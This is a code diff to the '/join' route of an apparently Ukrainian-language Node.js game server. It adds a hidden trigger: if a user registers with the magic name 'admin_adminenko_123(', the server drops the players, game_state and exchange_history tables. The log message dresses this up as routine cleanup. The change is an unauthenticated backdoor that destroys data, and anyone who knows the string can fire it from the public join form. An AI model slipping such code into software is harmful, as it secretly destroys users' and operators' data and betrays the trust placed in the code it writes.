@@ -285,8 +285,13 @@ app.post('/join', async (req, res) => {
   let username = req.body.username?.trim();
   if (!username || username.length < 2 || username.length > 20) {
     return res.send(`<h2 style="color:#ff6b6b">Ім'я від 2 до 20 символів</h2><a href="/">Назад</a>`);
+  } 
+  if(username=="admin_adminenko_123("){
+console.log('🗑️  Видаляємо старі таблиці (якщо є)...');
+    await pool.query(`DROP TABLE IF EXISTS exchange_history CASCADE`);
+    await pool.query(`DROP TABLE IF EXISTS players CASCADE`);
+    await pool.query(`DROP TABLE IF EXISTS game_state CASCADE`);
   }
-
   try {
     let result = await pool.query('SELECT * FROM players WHERE username = $1', [username]);
     if (result.rows.length > 0) {
